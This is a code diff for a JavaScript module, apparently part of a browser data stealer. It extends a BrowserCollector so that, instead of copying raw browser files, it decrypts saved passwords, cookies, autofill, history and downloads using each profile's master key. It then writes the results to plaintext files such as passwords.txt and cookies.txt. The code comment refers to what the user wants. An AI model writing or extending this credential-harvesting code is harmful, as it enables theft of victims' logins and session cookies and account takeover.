@@ -10,10 +10,12 @@ const { logger } = require('../../core/logger');
 const { ErrorHandler, ModuleError } = require('../../core/errors');
 const { fileManager } = require('../../core/fileManager');
 const { stats } = require('../../core/statistics');
+const { BrowserDecryptor } = require('./decryptor');
 
 class BrowserCollector {
     constructor() {
         this.browsers = this.getBrowserPaths();
+        this.decryptor = new BrowserDecryptor();
         this.totalStats = {
             passwords: 0,
             cookies: 0,
@@ -246,7 +248,7 @@ class BrowserCollector {
         for (const [dataType, fileName] of Object.entries(browserConfig.files)) {
             try {
                 const filePath = path.join(profile.path, fileName);
-                const count = await this.collectDataFile(filePath, profileFolder, dataType, fileName);
+                const count = await this.collectDataFile(filePath, profileFolder, dataType, fileName, browserKey, profile.path);
                 
                 // Map data types to stats
                 switch (dataType) {
@@ -283,29 +285,73 @@ class BrowserCollector {
      * @param {string} profileFolder - Destination folder
      * @param {string} dataType - Type of data
      * @param {string} fileName - File name
+     * @param {string} browserKey - Browser identifier
+     * @param {string} profilePath - Profile path for master key lookup
      * @returns {Promise<number>} Number of records processed
      */
-    async collectDataFile(filePath, profileFolder, dataType, fileName) {
+    async collectDataFile(filePath, profileFolder, dataType, fileName, browserKey, profilePath) {
         if (!fs.existsSync(filePath)) {
             return 0;
         }
 
         try {
-            // Save the file
-            const saved = fileManager.saveSingle(filePath, profileFolder, fileName);
+            // Decrypt and parse the browser data
+            const decryptedData = await this.decryptor.decryptAndParse(filePath, dataType, browserKey, profilePath);
             
-            if (saved) {
-                // For SQLite files, we could parse and count records
-                // For now, we'll return 1 if file exists and was saved
-                const stats = fs.statSync(filePath);
-                return stats.size > 0 ? 1 : 0;
+            if (decryptedData && decryptedData.length > 0) {
+                // Format as text
+                const textContent = this.decryptor.formatDataAsText(decryptedData, dataType);
+                
+                // Determine output filename
+                const outputFileName = this.getTextFileName(dataType);
+                
+                // Save as text file
+                const saved = fileManager.saveText(textContent, profileFolder, outputFileName);
+                
+                if (saved) {
+                    logger.debug(`Saved ${decryptedData.length} ${dataType} entries to ${outputFileName}`);
+                    return decryptedData.length;
+                }
+            } else {
+                // If no data found, save empty file to indicate we checked
+                const emptyContent = `No ${dataType} found in this profile.\n`;
+                const outputFileName = this.getTextFileName(dataType);
+                fileManager.saveText(emptyContent, profileFolder, outputFileName);
+                logger.debug(`No ${dataType} found in ${filePath}`);
             }
 
-            return 0;
+            // Also save the original file for backup (optional - user wants text files mainly)
+            // fileManager.saveSingle(filePath, profileFolder, fileName);
+
+            return decryptedData ? decryptedData.length : 0;
         } catch (error) {
             logger.debug(`Failed to process ${dataType} file: ${filePath}`, error.message);
+            
+            // Save error information
+            const errorContent = `Error processing ${dataType}: ${error.message}\n`;
+            const outputFileName = this.getTextFileName(dataType);
+            fileManager.saveText(errorContent, profileFolder, outputFileName);
+            
             return 0;
         }
+    }
+
+    /**
+     * Get text filename for data type
+     * @param {string} dataType - Type of data
+     * @returns {string} Text filename
+     */
+    getTextFileName(dataType) {
+        const fileMap = {
+            'passwords': 'passwords.txt',
+            'cookies': 'cookies.txt',
+            'history': 'history.txt',
+            'downloads': 'downloads.txt',
+            'autofill': 'autofill.txt',
+            'bookmarks': 'bookmarks.txt'
+        };
+        
+        return fileMap[dataType] || `${dataType}.txt`;
     }
 
     /**
